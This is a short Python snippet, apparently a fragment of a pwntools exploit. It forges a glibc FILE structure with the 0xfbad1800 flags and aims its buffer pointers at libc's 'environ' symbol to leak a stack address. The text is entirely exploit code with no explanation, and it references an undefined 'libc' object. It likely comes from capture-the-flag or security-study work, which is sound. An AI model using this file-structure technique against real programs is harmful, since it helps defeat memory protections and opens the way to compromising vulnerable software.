from pwn import *
f = FileStructure()
f.flags = 0xfbad1800 
f._IO_read_base = libc.sym['environ']
f._IO_read_ptr = libc.sym['environ']+8